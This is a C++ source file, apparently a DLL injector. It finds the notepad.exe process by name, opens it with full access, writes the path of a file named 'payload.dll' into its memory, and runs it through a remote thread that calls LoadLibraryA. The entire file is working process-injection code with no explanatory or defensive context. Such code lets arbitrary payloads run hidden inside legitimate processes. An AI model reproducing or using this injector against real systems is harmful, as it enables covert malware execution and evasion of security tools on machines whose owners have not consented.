#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <string>

// g++ dllinjector.cpp

int ProcID(const char* target)
{
	PROCESSENTRY32 pe;
	HANDLE snap = CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS, 0);
	pe.dwSize = sizeof(PROCESSENTRY32);
	if(snap == INVALID_HANDLE_VALUE)
	{
		return -1;
	}
	bool check = Process32First(snap, &pe);
	if(!check)
	{
		CloseHandle(snap);
		return -1;
	}
	while(check)
	{
		if(strcmp(target, pe.szExeFile) == 0)
		{
			CloseHandle(snap);
			return pe.th32ProcessID;
		}
		check = Process32Next(snap, &pe);
	}
	CloseHandle(snap);
	return -1;
}

int main()
{
	const char* dllpath = "C:\\Users\\Owner\\Desktop\\Projects\\Iron-Maiden\\payload.dll";
	const char* exe = "notepad.exe";
	size_t pathsize = strlen(dllpath) + 1;
	
	int pid = ProcID(exe);
	if(pid == -1)
	{
		std::cout << "[-] Could not find PID for program!";
		exit(-1);
	}
	HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
	if(proc == NULL)
	{
		std::cout << "[-] Could not obtain handle for " << pid << "!";
		exit(-1);
	}
	LPVOID allocation = VirtualAllocEx(proc, NULL, pathsize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE); // PAGE_EXECUTE_READWRITE
	if(allocation == NULL)
	{
		std::cout << "[-] Failed to allocate memory!";
		CloseHandle(proc);
		exit(-1);
	}
	if(!WriteProcessMemory(proc, allocation, dllpath, pathsize, NULL))
	{
		std::cout << "[-] Failed to write dll to memory!";
		VirtualFreeEx(proc, allocation, pathsize, MEM_RELEASE);
		CloseHandle(proc);
		exit(-1);
	}
	HANDLE tread = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"), allocation, 0, NULL);
	if(tread == NULL)
	{
		std::cout << "[-] Failed to execute DLL in remote process!\n";
		VirtualFreeEx(proc, allocation, pathsize, MEM_RELEASE);
		CloseHandle(proc);
		exit(-1);
	}
	WaitForSingleObject(tread, INFINITE);

	std::cout << "[+] Successfully injected & executed DLL with some cleaning up!";
	
	VirtualFreeEx(proc, allocation, pathsize, MEM_RELEASE);
	CloseHandle(tread);
	CloseHandle(proc);
	
}
